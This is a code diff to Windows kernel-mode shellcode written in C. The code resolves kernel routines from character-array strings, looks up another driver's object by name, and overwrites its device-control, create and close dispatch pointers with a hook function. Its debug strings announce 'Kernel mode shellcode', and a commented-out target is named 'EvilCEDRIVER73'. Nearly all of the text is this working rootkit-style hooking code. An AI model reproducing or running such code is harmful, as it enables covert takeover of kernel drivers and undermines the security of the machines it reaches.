@@ -62,6 +62,7 @@ typedef NTSTATUS(__stdcall* pObReferenceObjectByName)(
 typedef LONG_PTR(__stdcall* pObfDereferenceObject)(_In_  PVOID Object);
 typedef LONG_PTR(__stdcall* pRtlInitUnicodeString)(PUNICODE_STRING  DestinationString, PCWSTR SourceString);
 typedef NTSTATUS(__stdcall* pIoCreateDriver)(_In_  PUNICODE_STRING DriverName, _In_  PDRIVER_INITIALIZE InitializationFunction);
+typedef PVOID(__stdcall* p_InterlockedExchangePointerString)(PVOID * Target, _In_ PVOID Value);
 
 NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 	UNREFERENCED_PARAMETER(DeviceObject);
@@ -293,50 +294,35 @@ __stdcall PicStart(UINT64 StartContext)
 		return STATUS_UNSUCCESSFUL;
 	
 	// Function name and strings
-	WCHAR ioGetCurrentProcessName[] = { 'P','s','G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','\0' };
-	WCHAR psGetProcessIdName[] = { 'P','s','G','e','t','P','r','o','c','e','s','s','I','d','\0' };
-	WCHAR rtlCopyMemoryName[] = { 'R','t','l','C','o','p','y','M','e','m','o','r','y','\0' };
-	WCHAR DbgPrintName[] = { 'D', 'b', 'g', 'P', 'r', 'i', 'n', 't', '\0' };
+	WCHAR DbgPrintString[] = { 'D', 'b', 'g', 'P', 'r', 'i', 'n', 't', '\0' };
 	WCHAR  greeting[] = { 'H', 'e', 'l', 'l', 'o', ' ', 'f', 'r', 'o', 'm', ' ', 'K', 'e', 'r', 'n', 'e', 'l', ' ', 'm', 'o', 'd', 'e', ' ', 's', 'h', 'e', 'l', 'l', 'c', 'o', 'd', 'e', '!', '\0' };
 	WCHAR end[] = { 'S', 'h', 'e', 'l', 'l', 'c', 'o', 'd', 'e', ' ', 's', 'u', 'c', 'c', 'e', 's', 's', 'f', 'u', 'l', 'l', 'y', ' ', 'e', 'x', 'e', 'c', 'u', 't', 'e', 'd', '!', '\0' };
 	CHAR param[] = { '%', 'l', 's', 0 };
-
-	// Create UNICODE_STRING structures
-	UNICODE_STRING ioGetCurrentProcessString = RTL_CONSTANT_STRING(ioGetCurrentProcessName);
-	UNICODE_STRING psGetProcessIdString = RTL_CONSTANT_STRING(psGetProcessIdName);
-	UNICODE_STRING rtlCopyMemoryString = RTL_CONSTANT_STRING(rtlCopyMemoryName);
-	UNICODE_STRING dbgPrint = RTL_CONSTANT_STRING(DbgPrintName);
-
-	// Get function addresses
-	pIoGetCurrentProcess ioGetCurrentProcess = (pIoGetCurrentProcess)mmGetSystemRoutineAddress(&ioGetCurrentProcessString);
-	pPsGetProcessId psGetProcessId = (pPsGetProcessId)mmGetSystemRoutineAddress(&psGetProcessIdString);
-	pRtlCopyMemory rtlCopyMemory = (pRtlCopyMemory)mmGetSystemRoutineAddress(&rtlCopyMemoryString);
-	pDbgPrint myDbgPrint = (pDbgPrint)mmGetSystemRoutineAddress(&dbgPrint);
-
-	myDbgPrint(param, greeting);
-
-
-	//////////////////////////////
-	// my code start
-	
 	// \\driver\\EvilCEDRIVER73
 	//WCHAR driverNameString[] = { '\\', 'd', 'r', 'i', 'v', 'e', 'r', '\\', 'E', 'v', 'i', 'l', 'C', 'E', 'D', 'R', 'I', 'V', 'E', 'R', '7', '3', 0};
-	WCHAR driverObjectNameString[] = { '\\', 'D', 'r', 'i', 'v', 'e', 'r', '\\', 'K', 'e', 'r', 'n', 'e', 'l', 'P', 'I', 'S', 'C', 'r', 'e', 'a', 't', 'o', 'r', 0};
+	WCHAR driverObjectNameString[] = { '\\', 'D', 'r', 'i', 'v', 'e', 'r', '\\', 'K', 'e', 'r', 'n', 'e', 'l', 'P', 'I', 'S', 'C', 'r', 'e', 'a', 't', 'o', 'r', 0 };
 	WCHAR ObReferenceObjectByNameString[] = { 'O', 'b', 'R', 'e', 'f', 'e', 'r', 'e', 'n', 'c', 'e', 'O', 'b', 'j', 'e', 'c', 't', 'B', 'y', 'N', 'a', 'm', 'e', 0 };
 	WCHAR ObfDereferenceObjectString[] = { 'O', 'b', 'f', 'D', 'e', 'r', 'e', 'f', 'e', 'r', 'e', 'n', 'c', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
 	WCHAR IoDriverObjectTypeString[] = { 'I', 'o', 'D', 'r', 'i', 'v', 'e', 'r', 'O', 'b', 'j', 'e', 'c', 't', 'T', 'y', 'p', 'e', 0 };
 	CHAR DebugString[] = { 'T', 'a', 'r', 'g', 'e', 't', ' ', 'd', 'r', 'i', 'v', 'e', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ':', ' ', '0', 'x', '%', 'p', 0 };
+	WCHAR InterlockedExchangePointerString[] = { 'I', 'n', 't', 'e', 'r', 'l', 'o', 'c', 'k', 'e', 'd', 'E', 'x', 'c', 'h', 'a', 'n', 'g', 'e', 'P', 'o', 'i', 'n', 't', 'e', 'r', 0 };
 
 	// Create UNICODE_STRING structures
+	UNICODE_STRING dbgPrint = RTL_CONSTANT_STRING(DbgPrintString);
 	UNICODE_STRING driverObjectName = RTL_CONSTANT_STRING(driverObjectNameString);
 	UNICODE_STRING obReferenceObjectByNameString = RTL_CONSTANT_STRING(ObReferenceObjectByNameString);
 	UNICODE_STRING obfDereferenceObjectString = RTL_CONSTANT_STRING(ObfDereferenceObjectString);
 	UNICODE_STRING ioDriverObjectTypeString = RTL_CONSTANT_STRING(IoDriverObjectTypeString);
+	UNICODE_STRING interlockedExchangePointerString = RTL_CONSTANT_STRING(InterlockedExchangePointerString);
 
 	// Get function addresses
+	pDbgPrint myDbgPrint = (pDbgPrint)mmGetSystemRoutineAddress(&dbgPrint);
 	pObReferenceObjectByName obReferenceObjectByName = (pObReferenceObjectByName)mmGetSystemRoutineAddress(&obReferenceObjectByNameString);
 	pObfDereferenceObject obfDereferenceObject = (pObfDereferenceObject)mmGetSystemRoutineAddress(&obfDereferenceObjectString);
 	POBJECT_TYPE* ioDriverObjectType = (POBJECT_TYPE*)mmGetSystemRoutineAddress(&ioDriverObjectTypeString);
+	p_InterlockedExchangePointerString interlockedExchangePointer = (p_InterlockedExchangePointerString)mmGetSystemRoutineAddress(&interlockedExchangePointerString);
+
+	myDbgPrint(param, greeting); // Hello From Kernel mode shellcode!
 
 	// Local variables
 	PDRIVER_OBJECT DriverObject;
@@ -355,25 +341,18 @@ __stdcall PicStart(UINT64 StartContext)
 		return STATUS_UNSUCCESSFUL;
 	}
 
-	myDbgPrint(DebugString, DriverObject);
-
-	//myDbgPrint("Hook function: 0x%p", MyDispatchIoctlDBVM);
-	//myDbgPrint("Target DriverName : %ls", DriverObject->DriverName.Buffer);
+	myDbgPrint(DebugString, DriverObject); // Target driver object: 0x%p
 
 	// Hook IRP_MJ_DEVICE_CONTROL
 	for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
 		if (i == IRP_MJ_DEVICE_CONTROL  || i == IRP_MJ_CLOSE || i == IRP_MJ_CREATE) {
-			//myDbgPrint("Major Function Number : %d, %p", i, (PVOID*)&DriverObject->MajorFunction[i]);
-			InterlockedExchangePointer((PVOID*)&DriverObject->MajorFunction[i], HookedDispatchIoctl);
-			//myDbgPrint("Patched Major Function Number : %d, %p", i, (PVOID*)&DriverObject->MajorFunction[i]);
+			//interlockedExchangePointer((PVOID*)&DriverObject->MajorFunction[i], HookedDispatchIoctl);
+			DriverObject->MajorFunction[i] = HookedDispatchIoctl;
 		}
 	}
 	
 	obfDereferenceObject(DriverObject);
-	myDbgPrint(param, end);
-	
-	// my code end
-	//////////////////////////////
+	myDbgPrint(param, end); // Shellcode successfully executed!
 
 	return STATUS_SUCCESS;
 }
